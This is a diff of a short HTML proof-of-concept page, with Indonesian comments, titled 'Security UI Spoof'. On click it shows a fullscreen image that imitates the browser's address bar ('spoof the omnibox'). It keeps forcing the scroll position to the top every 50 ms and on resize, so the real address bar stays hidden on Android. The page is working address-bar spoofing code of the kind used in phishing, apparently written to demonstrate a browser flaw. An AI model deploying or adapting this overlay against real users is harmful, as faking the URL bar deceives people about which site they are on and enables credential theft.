@@ -1,101 +1,85 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Security UI Spoof (UX Demo)</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100vw;
-      height: 100vh;       /* lock viewport */
-      overflow: hidden;    /* prevent scroll */
-      background: #111;
-      color: #fff;
-      font-family: sans-serif;
-    }
-
-    #spoof {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      display: none;
-      z-index: 9999;
-      pointer-events: none;
-    }
-
-    #content {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      text-align: center;
-      z-index: 1;
-    }
-
-    input[type=file] {
-      display: none;
-    }
-  </style>
-</head>
+    <title>Security UI Spoof</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden; /* mencegah scroll manual */
+        }         
+        #spoof {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: none;
+            z-index: 9999;
+            object-fit: cover;
+            pointer-events: none;
+        }
+        #content {
+            text-align: center;
+            margin-top: 20vh;
+        }
+    </style>
+</head>  
 <body>
 
-<img id="spoof" src="spof1.png" alt="UI overlay">
+<img id="spoof" src="spoof.png" alt="overlay">
 <div id="content">
-  <h1>Click anywhere on the page to spoof the omnibox!</h1>
+    <br><br><br>
+    <center>
+        <h1>Click anywhere on the page to spoof the omnibox!</h1>
+    </center>
 </div>
 
-<input id="filePicker" type="file" accept="image/*" capture="environment">
-
 <script>
-const filePicker = document.getElementById('filePicker');
-const spoof = document.getElementById('spoof');
-const content = document.getElementById('content');
+const spoof = document.getElementById("spoof");
+const content = document.getElementById("content");
 
+// Fungsi paksa scroll ke atas
 function forceScrollTop() {
-  window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
-  document.body.scrollTop = 0;
-  document.documentElement.scrollTop = 0;
+    window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
+    document.body.scrollTop = 0;
+    document.documentElement.scrollTop = 0;
 }
 
-// Tap anywhere: langsung overlay + fullscreen + file picker
-document.addEventListener('click', async () => {
-  spoof.style.display = 'block';
-  content.style.display = 'none';
+// Klik anywhere
+onclick = async () => {
+    try {
+        // Jika ingin trigger contacts, bisa aktifkan ini
+        // await navigator.contacts.select(["name"], {});
+    } catch(e) {}
 
-  if (document.documentElement.requestFullscreen) {
-    try { await document.documentElement.requestFullscreen(); } catch(e) {}
-  }
+    spoof.style.display = "block";
+    content.style.display = "none";
 
-  filePicker.click();
-}, { once: true });
+    if (document.documentElement.requestFullscreen) {
+        try {
+            await document.documentElement.requestFullscreen();
+        } catch(e) {}
+    }
+}
 
-// Deteksi keluar fullscreen
+// Ketika keluar fullscreen → scroll ke atas otomatis
 document.addEventListener('fullscreenchange', () => {
-  if (!document.fullscreenElement) {
-    forceScrollTop();
-  }
+    if (!document.fullscreenElement) {
+        forceScrollTop();
+    }
 });
 
-// Interval polling ekstra untuk tombol back Android / browser resize
-setInterval(() => {
-  forceScrollTop();
-}, 50);
+// Interval ekstra untuk tombol back Android / omnibar muncul
+setInterval(forceScrollTop, 50);
 
-// Optional: resize listener untuk nutup omnibar
-window.addEventListener('resize', () => {
-  forceScrollTop();
-});
+// Resize listener juga untuk Android omnibar
+window.addEventListener('resize', forceScrollTop);
 
-filePicker.addEventListener('change', () => {
-  if (filePicker.files.length > 0) {
-    alert('File selected: ' + filePicker.files[0].name);
-  }
-});
 </script>
 
 </body>
